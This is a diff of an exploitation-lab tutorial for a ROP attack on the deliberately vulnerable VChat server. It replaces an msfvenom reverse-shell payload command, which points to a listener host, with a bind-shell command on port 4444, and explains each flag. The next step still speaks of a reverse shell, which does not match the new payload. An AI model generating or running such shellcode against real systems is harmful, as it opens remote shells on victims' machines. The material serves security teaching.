@@ -342,25 +342,22 @@ The stack after SHELL runs.
 
          https://github.com/DaintyJet/VChat_TRUN_ROP/assets/60448620/b5d8de53-356d-4400-8ee7-df7bda4be74c
 
-5. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).
-
+5. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). We create a bind shell. This is a program that listens for connections on the target machine and provides a shell to anyone that makes a tcp connection to the port it is listening on. We can generate the shellcode with the following command.
+	```sh
+	msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
-	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
-	```
-	* `-p `: Payload we are generating shellcode for.
-    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
-    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
-    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
-    	* `EXITFUNC=thread`: Create a thread to run the payload.
-  	* `-f`: The output format.
-    	* `python`: Format for use in python scripts.
-  	* `-v`: Specify a custom variable name.
-    	* `SHELL`: Shell Variable name.
-  	* `-a x86`: Specify the target architecture as `x86`
-	* `--platform windows`: Specify the target platform as Windows
-  	* `-b`: Specifies bad chars and byte values. This is given in the byte values.
-      	* `\x00\x0a\x0d`: Null char, carriage return, and newline.
-
+   * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
+   * `-p windows/shell_bind_tcp`: Specify we are using the tcp bind shell payload for windows.
+     * `RPORT=4444`: Specify the Receiving (Remote) port is 4444.
+     * `EXITFUNC=thread`: Exit process, this is running as a thread.
+     * `-f`: The output format.
+       * `python`: Format for use in python scripts.
+     * `-v`: Specify a custom variable name.
+     * `SHELL`: Shell Variable name.
+     * `-a x86`: Specify the target architecture as `x86`
+     * `--platform windows`: Specify the target platform as Windows
+     * `-b`: Specifies bad chars and byte values. This is given in the byte values.
+       * `\x00\x0a\x0d`: Null char, carriage return, and newline.
 6. Now, we can modify the exploit program to reflect [exploit2.py](./SourceCode/exploit2.py) and verify that we can acquire a reverse shell!
 
    https://github.com/DaintyJet/VChat_TRUN_ROP/assets/60448620/2494cc5f-1c18-4020-95ef-1b36454cf147
